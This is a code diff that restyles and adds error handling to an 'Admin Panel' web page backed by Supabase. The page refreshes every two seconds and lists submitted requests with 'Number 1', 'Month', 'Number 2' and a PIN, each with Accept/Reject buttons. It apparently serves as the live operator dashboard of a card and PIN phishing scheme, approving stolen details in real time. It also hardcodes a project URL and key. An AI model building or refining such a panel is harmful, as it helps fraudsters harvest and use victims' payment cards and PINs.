@@ -4,40 +4,80 @@
 
 <title>Admin Panel</title>
 
-<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
+<script src="https://unpkg.com/@supabase/supabase-js@2"></script>
 
 <style>
 
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
 body{
-    background:#111;
+    background:#0f0f0f;
     color:white;
     font-family:Arial;
     padding:30px;
 }
 
+h1{
+    margin-bottom:30px;
+    text-align:center;
+    font-size:40px;
+}
+
 .card{
     background:#1b1b1b;
-    padding:20px;
+    padding:25px;
     margin-bottom:20px;
-    border-radius:15px;
+    border-radius:20px;
+    border:1px solid rgba(255,255,255,0.08);
+}
+
+.card h3{
+    margin-bottom:15px;
+    color:#ff0080;
+}
+
+.card p{
+    margin-bottom:10px;
+    color:#ddd;
 }
 
 button{
-    padding:10px 15px;
+    padding:12px 18px;
     border:none;
-    border-radius:10px;
+    border-radius:12px;
     margin-right:10px;
+    margin-top:10px;
     cursor:pointer;
+    font-weight:bold;
+    transition:0.3s;
+}
+
+button:hover{
+    transform:scale(1.05);
 }
 
 .accept{
-    background:green;
+    background:#00c853;
     color:white;
 }
 
 .reject{
-    background:red;
+    background:#ff1744;
     color:white;
+}
+
+.pin{
+    color:#ffd54f;
+    font-weight:bold;
+}
+
+.status{
+    color:#00e5ff;
+    font-weight:bold;
 }
 
 </style>
@@ -51,22 +91,35 @@ button{
 
 <script>
 
-const SUPABASE_URL = 'https://ijvtokyhuqrwndyfxzrn.supabase.co/rest/v1/';
-const SUPABASE_KEY = 'sb_publishable_I6WAJg-zdYfB95rbcm57rQ_iXpU0s52';
+const SUPABASE_URL =
+'https://ijvtokyhuqrwndyfxzrn.supabase.co';
 
-const client = supabase.createClient(
-SUPABASE_URL,
-SUPABASE_KEY
+const SUPABASE_KEY =
+'sb_publishable_I6WAJg-zdYfB95rbcm57rQ_iXpU0s52';
+
+const client = window.supabase.createClient(
+    SUPABASE_URL,
+    SUPABASE_KEY
 );
 
 
 // LOAD DATA
 async function loadData(){
 
-    const { data } = await client
+    const { data, error } = await client
     .from('requests')
     .select('*')
     .order('id',{ascending:false});
+
+    if(error){
+
+        document.getElementById('data').innerHTML =
+        '<h2>Error Loading Data</h2>';
+
+        console.log(error);
+
+        return;
+    }
 
     let html = '';
 
@@ -76,47 +129,69 @@ async function loadData(){
 
         <div class="card">
 
-        <h3>ID: ${row.id}</h3>
+        <h3>Request ID: ${row.id}</h3>
 
-        <p>Number1: ${row.number1}</p>
+        <p>
+        <b>Number 1:</b>
+        ${row.number1}
+        </p>
 
-        <p>Date: ${row.date_value}</p>
+        <p>
+        <b>Month:</b>
+        ${row.date_value}
+        </p>
 
-        <p>Number2: ${row.number2}</p>
+        <p>
+        <b>Number 2:</b>
+        ${row.number2}
+        </p>
 
-        <p>Status: ${row.status}</p>
+        <p class="status">
+        STATUS:
+        ${row.status}
+        </p>
 
         `;
 
-        // ACCEPT/REJECT
+        // ACCEPT / REJECT
         if(row.status === 'pending'){
 
             html += `
 
             <button class="accept"
             onclick="acceptReq(${row.id})">
+
             Accept
+
             </button>
 
             <button class="reject"
             onclick="rejectReq(${row.id})">
+
             Reject
+
             </button>
 
             `;
 
         }
 
-        // PIN
+        // PIN SHOW
         if(row.pin){
 
             html += `
 
-            <hr>
+            <hr style="margin:20px 0; border-color:#333;">
 
-            <p>PIN: ${row.pin}</p>
+            <p class="pin">
+            PIN:
+            ${row.pin}
+            </p>
 
-            <p>PIN STATUS: ${row.pin_status}</p>
+            <p>
+            <b>PIN STATUS:</b>
+            ${row.pin_status}
+            </p>
 
             `;
 
@@ -129,12 +204,16 @@ async function loadData(){
 
             <button class="accept"
             onclick="acceptPin(${row.id})">
+
             Accept PIN
+
             </button>
 
             <button class="reject"
             onclick="rejectPin(${row.id})">
+
             Reject PIN
+
             </button>
 
             `;
@@ -149,12 +228,14 @@ async function loadData(){
 
 }
 
+
+// AUTO REFRESH
 setInterval(loadData,2000);
 
 loadData();
 
 
-// ACCEPT
+// ACCEPT REQUEST
 async function acceptReq(id){
 
     await client
@@ -167,7 +248,7 @@ async function acceptReq(id){
 }
 
 
-// REJECT
+// REJECT REQUEST
 async function rejectReq(id){
 
     await client
